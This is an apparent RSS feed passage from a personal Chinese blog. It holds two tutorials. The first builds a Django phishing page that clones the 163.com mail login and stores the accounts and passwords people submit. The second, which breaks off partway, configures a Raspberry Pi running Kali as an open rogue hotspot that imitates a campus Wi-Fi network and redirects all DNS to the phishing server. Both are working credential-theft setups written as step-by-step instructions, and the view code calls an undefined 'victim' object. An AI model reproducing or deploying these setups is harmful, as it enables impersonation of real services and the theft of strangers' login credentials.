    &lt;p&gt;进入&lt;a href=&quot;http://mail.163.com/&quot;&gt;http://mail.163.com/&lt;/a&gt;网页，右键，保存所有网页文件&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改html文件，删减无用代码，删除js，使其成为一个静态页面&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;替换精简后的html文件中的链接为本地静态文件：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
  {% load static %}
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{% static &#39;163/163logo.gif&#39; %}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{% static &#39;163/loginpage.css&#39; %}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  ...
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改表单响应：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &amp;lt;form action=&quot;/mail/163/login/&quot; method=&quot;post&quot;&amp;gt;
  ...
      &amp;lt;input type=&quot;text&quot; name=&quot;account&quot;&amp;gt;
      &amp;lt;input type=&quot;password&quot; name=&quot;password&quot;&amp;gt;
      &amp;lt;input type=&quot;submit&quot;&amp;gt;
  ...
  &amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;如碰到iframe：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &amp;lt;iframe rc=&quot;/mail/163/login/&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-3&quot;&gt;编写逻辑文件&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;编写mail/models.py文件，定义数据库记录对象：&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# coding:utf-8&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;__future__&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unicode_literals&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;django.db&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Phishee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CharField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CharField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DateTimeField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auto_now&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;other&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;models&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TextField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__unicode__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Meta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;db_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;phishee&#39;&lt;/span&gt;			&lt;span class=&quot;c&quot;&gt;# 指定表名&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;编写完后同步数据库&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python manage.py makemigrations
$ python manage.py migrate
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;编写mail/view.py文件：&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# coding:utf-8&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;django.shortcuts&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_to_response&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;django&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forms&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;mail.models&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Phishee&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PhisheeForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CharField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CharField&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index_163&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_to_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;163/index.html&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;login_163&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;POST&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PhisheeForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cleaned_data&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;phishee&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Phishee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;account&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# &#39;account&#39;与表单中input对应&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# &#39;password&#39;与表单中input对应&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;phishee&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;phishee&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;						&lt;span class=&quot;c&quot;&gt;# 存入数据库等其他逻辑&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PhisheeForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_to_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;163/login.html&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-4&quot;&gt;修改配置文件&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;修改phisher/settings.py文件：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ALLOWED_HOSTS = [&#39;*&#39;]		# 允许所有IP地址访问
  INSTALLED_APPS = [
      ...,
      &#39;mail&#39;,					# 注册app
  ]
  # 注释掉防止跨站请求伪造的中间件CsrfViewMiddleware
  MIDDLEWARE = [
      ...,
      #&#39;django.middleware.csrf.CsrfViewMiddleware&#39;,
      ...
  ]
  # 修改数据库
  DATABASES = {
      &#39;default&#39;: {
          &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,
          &#39;NAME&#39;: &#39;??&#39;,
          &#39;USER&#39;: &#39;??&#39;,
          &#39;PASSWORD&#39;: &#39;??&#39;,
          &#39;HOST&#39;: &#39;127.0.0.1&#39;,
          &#39;PORT&#39;: &#39;3306&#39;,
      }
  }
  TIME_ZONE = &#39;Asia/Shanghai&#39;	# 修改时区
  USE_TZ = False
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改phisher/url.py文件：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  urlpatterns = [
      url(r&#39;^static/(?P&amp;lt;path&amp;gt;.*)$&#39;, static_views.serve),
      url(r&#39;^admin/&#39;, admin.site.urls),
      url(r&#39;^mail/163/index/$&#39;, views.index_163),
      url(r&#39;^mail/163/login/$&#39;, views.login_163),
      url(r&#39;^&#39;, views.index_163),
  ]
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-5&quot;&gt;测试&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	$ manage.py runserver 8000
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;用浏览器打开&lt;a href=&quot;27.0.0.1:8000&quot;&gt;127.0.0.1:8000&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;apache24cgi&quot;&gt;使用Apache24运行CGI程序&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在/usr/local/etc/apache2/2.4/httpd.conf文件末尾添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  # 添加mod_wsgi.so模块
  LoadModule wsgi_module libexec/mod_wsgi-py27.so

  # 指定项目的wsgi.py配置文件路径  
  WSGIScriptAlias / /Users/wuyinan/Projects/python/phisher/phisher/wsgi.py

  # 指定项目路径  
  WSGIPythonPath /Users/wuyinan/Projects/python/phisher

  &amp;lt;Directory &quot;/Users/wuyinan/Projects/python/phisher&quot;&amp;gt;
    &amp;lt;Files wsgi.py&amp;gt;
      Order deny,allow
      Allow from all  
    &amp;lt;/Files&amp;gt;
  &amp;lt;/Directory&amp;gt;

  # 指定Log路径
  ErrorLog /Users/wuyinan/Projects/python/phisher/log/error.log
  LogLevel warn
  CustomLog /Users/wuyinan/Projects/python/phisher/log/access.log combined
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;测试：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ sudo apachectl start
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;用浏览器打开&lt;a href=&quot;27.0.0.1&quot;&gt;127.0.0.1&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/2015-08-22-1.jpeg&quot; alt=&quot;测试界面&quot; title=&quot;测试界面&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
</description>
        <pubDate>Sat, 22 Aug 2015 23:13:23 +0800</pubDate>
        <link>https://wuyinan0126.github.io//2015/Django%E6%90%AD%E5%BB%BA%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io//2015/Django%E6%90%AD%E5%BB%BA%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/</guid>
        
        <category>原创</category>
        
        <category>技术宅</category>
        
        
        <category>原创</category>
        
        <category>技术宅</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 树莓派2创建钓鱼热点</title>
        <description>&lt;p&gt;&lt;em&gt;使用树莓派2和无线网卡创建钓鱼热点，使其能发射无线信号、分配IP地址、DNS解析、导入流量到钓鱼网站、保存用户信息等&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;关于树莓派&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;The Raspberry Pi is a tiny and affordable computer that you can use to learn programming through fun, practical projects.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://www.raspberrypi.org/&quot;&gt;树莓派&lt;/a&gt;是一个小型的而且很便宜的（$35）电脑，在这个电脑上你可以通过有趣的实用的项目学习编程&lt;/p&gt;

&lt;p&gt;树莓派2 Model B长这样：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2015-06-27-1.jpg&quot; alt=&quot;树莓派2 Model B&quot; title=&quot;树莓派2 Model B&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;关于系统&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Raspbian is a free operating system based on Debian optimized for the Raspberry Pi hardware.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;树莓派官方出的系统是&lt;a href=&quot;https://www.raspbian.org/&quot;&gt;Raspbian&lt;/a&gt;，基于Debian并根据树莓派的硬件进行了优化&lt;/p&gt;

&lt;p&gt;当然其他的操作系统，如Ubuntu、Fedora都有针对树莓派的版本。我选的系统是Kali Linux，选它的原因请参考标题&lt;/p&gt;

&lt;p&gt;Kali官方有针对树莓派2的版本，具体安装教程：&lt;a href=&quot;http://docs.kali.org/kali-on-arm/install-kali-linux-arm-raspberry-pi&quot;&gt;Kali Linux – Raspberry Pi&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;micro-sd&quot;&gt;关于无线网卡和Micro SD卡&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;我选的无线网卡是&lt;a href=&quot;http://item.jd.com/509932.html&quot;&gt;EDUP EP-N8508GS黄金版 迷你USB无线网卡 树莓派专用&lt;/a&gt;，芯片是rtl8188cus，免驱即插即用。&lt;/p&gt;

&lt;p&gt;选择无线网卡的时候请参考官网：&lt;a href=&quot;http://elinux.org/RPi_USB_Wi-Fi_Adapters&quot;&gt;RPi USB Wi-Fi Adapters&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;我选的Micro SD卡是&lt;a href=&quot;http://item.jd.com/679773.html&quot;&gt;闪迪（SanDisk）32GB UHS-I 至尊高速移动MicroSDHC-TF存储卡（读速48Mb/s）&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;选择Micro SD卡的时候请参考官网：&lt;a href=&quot;http://elinux.org/RPi_SD_cards&quot;&gt;RPi SD cards&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;安装和配置相关软件&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;假设已经按照教程安装好了系统，也插上无线网卡了，接下来就是安装必要的软件。&lt;/p&gt;

&lt;p&gt;连接树莓派的方式有通过显示器（需要HDMI转接头）、SSH登录、VNC连接等，因为Kali开机自动启动SSH Server，所以只要知道树莓派的IP地址，用SSH连过去就行了，Kali的默认用户名是root，登录密码是toor。&lt;/p&gt;

&lt;p&gt;代码前有#的表示在bash下以root身份运行的代码，没有的表示修改的文件内容。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;修改更新源，在/etc/apt/sources.list中添加：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib
 deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib
 deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free
 deb http://mirrors.aliyun.com/kali kali main non-free contrib
 deb-src http://mirrors.aliyun.com/kali kali main non-free contrib
 deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;然后进行更新：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # apt-get update &amp;amp;&amp;amp; apt-get upgrade
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;根分区扩充&lt;/p&gt;

    &lt;p&gt;下面链接中的文件可能有更新，请根据需要进入对应目录选择版本&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # wget http://archive.raspberrypi.org/debian/pool/main/r/raspi-config/raspi-config_20150131-1_all.deb
 # wget http://http.us.debian.org/debian/pool/main/t/triggerhappy/triggerhappy_0.3.4-2_armhf.deb
 # wget http://http.us.debian.org/debian/pool/main/l/lua5.1/lua5.1_5.1.5-7.1_armhf.deb
 # dpkg -i triggerhappy_0.3.4-2_armhf.deb
 # dpkg -i lua5.1_5.1.5-7.1_armhf.deb
 # dpkg -i raspi-config_20150131-1_all.deb
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;然后使用raspi-config命令进入系统设置，选择第一项Expand Filesystem扩充，当然系统设置中还有其他设置，根据需要进行设置即可。用df -lh检查文件系统大小，根分区是否为SD卡大小&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装和配置hostapd&lt;/p&gt;

    &lt;p&gt;hostapd的作用是提供无线共享，即配置并成功运行hostapd后，能够搜索到热点&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # apt-get install hostapd
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;由于无线网卡支持的问题，系统安装的hostapd不支持rtl8188cus芯片，需要将hostapd替换为兼容版本：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip
 # unzip hostapd.zip 
 # sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak
 # sudo mv hostapd /usr/sbin/hostapd.cat
 # sudo ln -sf /usr/sbin/hostapd.cat /usr/sbin/hostapd  
 # sudo chmod 755 /usr/sbin/hostapd
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;修改（没有的话新建）/etc/hostapd/hostapd.conf：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; interface=wlan0            
 ctrl_interface=wlan0
 ctrl_interface_group=0
 ssid=BUAA-WiFi                # 伪热点名，例如我的是校园网的WiFi热点名            
 channel=2                  
 macaddr_acl=0              
 ignore_broadcast_ssid=0    
 driver=rtl871xdrv         
 hw_mode=g                        
 wmm_enabled=1
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;因为是用来钓鱼的伪热点，所以不设置热点密码&lt;/p&gt;

    &lt;p&gt;修改/etc/default/hostapd，去掉DAEMON_CONF前的注释符号并修改为我们的配置文件路径：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;启动hostapd：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # service hostapd start
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装和配置dnsmasq&lt;/p&gt;

    &lt;p&gt;dnsmasq提供的是为接进热点的设备分配IP以及进行流量引导，Kali中已经安装好dnsmasq了&lt;/p&gt;

    &lt;p&gt;修改（没有的话新建）/etc/dnsmasq.conf：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; interface=wlan0
 bind-interfaces
 domain=rpi
 address=/#/192.168.126.126        # 将对所有网站的访问重定向到本机
 dhcp-range=192.168.126.97,192.168.126.125,255.255.255.224,12h	# IP分配池和过期时间
 dhcp-option=3,192.168.126.126 	  # Router IP
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;

    &lt;p&gt;启动dnsmasq：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # dnsmasq
